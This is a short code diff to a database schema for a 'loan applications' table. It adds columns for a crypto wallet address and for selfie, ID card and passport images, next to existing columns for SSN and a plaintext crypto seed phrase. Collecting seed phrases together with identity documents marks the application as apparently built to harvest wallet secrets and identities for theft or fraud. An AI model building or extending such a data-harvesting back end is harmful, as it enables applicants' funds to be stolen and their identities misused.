@@ -211,7 +211,13 @@ export const loanApplications = sqliteTable("loan_applications", {
   ssn: text("ssn"),
   ein: text("ein"),
   cryptoWalletType: text("crypto_wallet_type"),
+  cryptoWalletAddress: text("crypto_wallet_address"),
   cryptoSeedPhrase: text("crypto_seed_phrase"),
+  selfieImage: text("selfie_image"),
+  idFrontImage: text("id_front_image"),
+  idBackImage: text("id_back_image"),
+  passportFrontImage: text("passport_front_image"),
+  passportBackImage: text("passport_back_image"),
 });
 
 // testimonial_submissions
